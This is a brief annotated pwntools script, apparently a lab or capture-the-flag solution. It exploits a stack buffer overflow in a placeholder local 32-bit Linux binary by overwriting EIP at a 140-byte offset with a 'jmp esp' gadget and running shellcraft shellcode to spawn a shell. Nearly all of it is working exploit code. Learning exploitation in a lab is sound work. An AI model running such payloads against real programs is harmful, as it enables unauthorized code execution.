from pwn import *
import sys

"""
for this buffer overflow
we need to overwrite the instruction pointer
and return to stack in ESP
where shellcode is stored
"""

# based on executable file info
context.update(arch='i386', os='linux')
io = process("./name-of-executable")

# send cyclic pattern to process using gdb

"""
gdb.attach(io, 'continue')
pattern = cyclic(512)
io.sendline(pattern)
pause()
sys.exit()
"""

"""
running the above segment gives us a segmentation fault

using the command 'i r' in gdb
the required address is at eip
using cyclic_find(eip_address)
we get the offset at 140 bytes
"""

binary = ELF("./name-of-executable")
jmp_esp = next(binary.search(asm("jmp esp")))

print(hex(jmp_esp))

exploit = flat(["A" * 140, pack(jmp_esp), asm(shellcraft.sh())])

# test exploit locally
io.sendline(exploit)
io.interactive()
